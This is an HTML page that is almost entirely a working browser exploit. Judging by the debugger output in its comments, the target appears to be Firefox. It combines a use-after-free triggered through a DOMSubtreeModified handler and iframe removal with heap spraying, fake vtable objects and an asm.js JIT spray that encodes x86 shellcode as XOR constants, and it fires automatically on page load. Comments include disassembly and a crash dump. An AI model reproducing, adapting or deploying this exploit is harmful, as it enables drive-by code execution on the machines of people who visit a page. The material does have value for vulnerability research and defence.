<html>
    <script>
        
        var doc = null;
        var cnt = 0;

        function jit_spray(stdlib, ffi, heap)
        {
            "use asm";
            var tmp = ffi.tmp;

            function f(a)
            {
                a = a|0;
                /* set eip = 0x2711003c
                    No prior disassembly possible
                    2711003c 90              nop
                    2711003d 90              nop
                    2711003e 90              nop
                    2711003f 3c35            cmp     al,35h
                    27110041 33c0            xor     eax,eax
                    27110043 90              nop
                    27110044 3c35            cmp     al,35h
                    27110046 b030            mov     al,30h
                    27110048 90              nop
                    27110049 3c35            cmp     al,35h
                    2711004b 648b00          mov     eax,dword ptr fs:[eax]
                    2711004e 3c35            cmp     al,35h
                    27110050 8b400c          mov     eax,dword ptr [eax+0Ch]
                    27110053 3c35            cmp     al,35h
                    27110055 8b401c          mov     eax,dword ptr [eax+1Ch]
                    27110058 3c35            cmp     al,35h
                    2711005a 8b5008          mov     edx,dword ptr [eax+8]
                    2711005d 3c35            cmp     al,35h
                    2711005f 8b7820          mov     edi,dword ptr [eax+20h]
                    27110062 3c35            cmp     al,35h
                    27110064 8b00            mov     eax,dword ptr [eax]
                    27110066 90              nop
                    27110067 3c35            cmp     al,35h
                    ...
                */
                a = a ^ 0x2711003c;
                a = a ^ 0x2711003c;
                a = a ^ 0x2711003c;
                a = a ^ 0x2711003c;            

                /* now shellcode starts here */
                a = a ^ 0x3c909090; // 90              nop
                a = a ^ 0x3c90C033; // 33c0            xor     eax,eax
                a = a ^ 0x3c9030b0; // b030            mov     al,30h
                a = a ^ 0x3c008b64; // 648b00          mov     eax,dword ptr fs:[eax]
                a = a ^ 0x3c0c408b; // ...
                a = a ^ 0x3c1c408b;
                a = a ^ 0x3c08508b;
                a = a ^ 0x3c20788b;
                a = a ^ 0x3c90008b;
                a = a ^ 0x6a6d3f80;
                a = a ^ 0x3c90eA75;
                a = a ^ 0x3c904747;
                a = a ^ 0x6a733f80;
                a = a ^ 0x3c90ef75;
                a = a ^ 0x3c904747;
                a = a ^ 0x6a763f80;
                a = a ^ 0x3c90ef75;
                a = a ^ 0x3c904747;
                a = a ^ 0x6a633f80;
                a = a ^ 0x3c90ef75;
                a = a ^ 0x3c529090;
                a = a ^ 0x3c3cc283;
                a = a ^ 0x3c903a8b;
                a = a ^ 0x3c24148b;
                a = a ^ 0x3c90d703;
                a = a ^ 0x3c78c283;
                a = a ^ 0x3c903a8b;
                a = a ^ 0x3c24148b;
                a = a ^ 0x3c90d703;
                a = a ^ 0x3c18c283;
                a = a ^ 0x3c903a8b;
                a = a ^ 0x3c04c283;
                a = a ^ 0x3c901a8b;
                a = a ^ 0x3c241c03;
                a = a ^ 0x3c04c283;
                a = a ^ 0x3c90328b;
                a = a ^ 0x3c243403;
                a = a ^ 0x3c04c283;
                a = a ^ 0x3c900a8b;
                a = a ^ 0x3c240c03;
                a = a ^ 0x3cb89090;
                a = a ^ 0x3c900000;
                a = a ^ 0x3c9065b0;
                a = a ^ 0x3c906db4;
                a = a ^ 0x3c905090;
                a = a ^ 0x3cb89090;
                a = a ^ 0x3c907473;
                a = a ^ 0x3c9073b0;
                a = a ^ 0x3c9079b4;
                a = a ^ 0x3c905090;
                a = a ^ 0x3c90d78b;
                a = a ^ 0x3c90ff33;
                a = a ^ 0x3c90C033;
                a = a ^ 0x3c535156;
                a = a ^ 0x14909090;
                a = a ^ 0x3c909090;
                a = a ^ 0x3c574790;
                a = a ^ 0x3c90C033;
                a = a ^ 0x3c24048b;
                a = a ^ 0x3c02e0c1;
                a = a ^ 0x3c90f003;
                a = a ^ 0x3c90068b;
                a = a ^ 0x3c18c483;
                a = a ^ 0x3c240403;
                a = a ^ 0x3c18ec83;
                a = a ^ 0x3c90c933;
                a = a ^ 0x3c9006b1;
                a = a ^ 0x3c10c483;
                a = a ^ 0x3c90f48b;
                a = a ^ 0x3c90f88b;
                a = a ^ 0x3c10c483;
                a = a ^ 0x6a90a6f3;
                a = a ^ 0x14901474;
                a = a ^ 0x3c1cec83;
                a = a ^ 0x3c595b5f;
                a = a ^ 0x3c90905e;
                a = a ^ 0x3c908beb;
                a = a ^ 0x3c1cec83;
                a = a ^ 0x3c595b5f;
                a = a ^ 0x3c90905e;
                a = a ^ 0x3c90e7d1;
                a = a ^ 0x3c90cf03;
                a = a ^ 0x3c90c033;
                a = a ^ 0x3c018b66;
                a = a ^ 0x3c02e0c1;
                a = a ^ 0x3c90c303;
                a = a ^ 0x3c90188b;
                a = a ^ 0x3c08c483;
                a = a ^ 0x3c241c03;
                a = a ^ 0x646170B8;
                a = a ^ 0x000000b9;
                a = a ^ 0x3C50c12b;
                a = a ^ 0x00B89090;
                a = a ^ 0x3c906574;
                a = a ^ 0x3c906fb4;
                a = a ^ 0x3C506eb0; // ...
                a = a ^ 0x3cd3ff54; // 54              push    esp
                                    // ffd3            call    ebx
                a = a ^ 0x3ccccccc; // cc              int     3

                return a|0;
            }
            return f;
        }

        //Math.atan2(0x111, "Starting heap spray"); // for debug
        function spray(blocks, size)
        {
            var arr = [];
            for(var i=0; i<blocks; i++)
            {
                arr[i] = new Array(size);
                for(var j=0; j<size; j+=2)
                {
                    arr[i][j] = 0x41414141;
                    arr[i][j+1] = 0x42424242;
                }
            }
            return arr;
        }

        function gc()
        {
            for(var i=0; i<0x10; i++)
                var g = new ArrayBuffer(0x1000000);
        }

        function handler()
        {
            if(cnt > 0)
                return;
            doc.body.appendChild(document.createElement("audio")).remove(); // free
            spray(1024, 1024);
            ++cnt;
        }

        function pwn()
        {
            /* reuse freed object which includes vtable
                (570.f80): Access violation - code c0000005 (first chance)
                First chance exceptions are reported before any exception handling.
                This exception may be expected and handled.
                eax=1205f400 ebx=00000000 ecx=0083e278 edx=61626364 esi=0083e294 edi=0e93cc40
                eip=6b6504ca esp=0083e268 ebp=0083e27c iopl=0         nv up ei pl nz na pe nc
                cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210206
                xul!nsCOMPtr<nsIContent>::nsCOMPtr<nsIContent>+0x1d [inlined in xul!nsCOMPtr<nsIContent>::nsCOMPtr<nsIContent>+0x1d]:
                6b6504ca call    dword ptr [edx]                      ds:002b:61626364=????????
            */
            if(cnt > 0)
            {
                doc.getElementsByTagName("*")[0].removeEventListener("DOMSubtreeModified", handler, false);

                var fake_object = new Array();
                
                for(var i=0; i<4096; i++) // fill the hole
                {
                    fake_object[i] = new Uint32Array(256);
                    //fake_object[i][0] = 0x61626364; // for poc
                    fake_object[i][0] = 0x27110028; // vtable -> jited page
                    /* set fake vtable pointer as start of jited page 
                        0:000> dd 27110028
                        27110028  2711003c 11003c35 003c3527 3c352711
                        27110038  35271100 3c909090 90c03335 30b0353c
                        27110048  64353c90 353c008b 3c0c408b 1c408b35
                        27110058  508b353c 8b353c08 353c2078 3c90008b
                        27110068  6d3f8035 ea75356a 47353c90 353c9047
                        27110078  6a733f80 90ef7535 4747353c 80353c90
                        27110088  356a763f 3c90ef75 90474735 3f80353c
                        27110098  75356a63 353c90ef 3c529090 3cc28335
                    */
                    for(var j=1; j<256; j++)
                        fake_object[i][j] = 0x91919191;
                }

                //gc();
                
                var modules = [];
                var ab = new ArrayBuffer(0x10000);
                for(var i=0; i<10000; i++)
                    modules[i] = jit_spray(window, {tmp: () => {}}, ab);
                
                window.fake_object = fake_object;
                document.getElementById("exp").remove(); // re-use...Boom!!
            }
        }

        function main()
        {
            var hh = spray(4096, 1024);
            document.body.setAttribute('hh', hh);
            doc = document.getElementById("exp").contentWindow.document;
            doc.getElementsByTagName("*")[0].addEventListener("DOMSubtreeModified", handler, false);
            doc.getElementsByTagName("*")[0].style = "PWNED";
            setInterval("pwn();", 1000);
        }

    </script>
    <body onload='main();'>
        <iframe src='about:blank' id='exp' width="100%"></iframe>
    </body>
</html>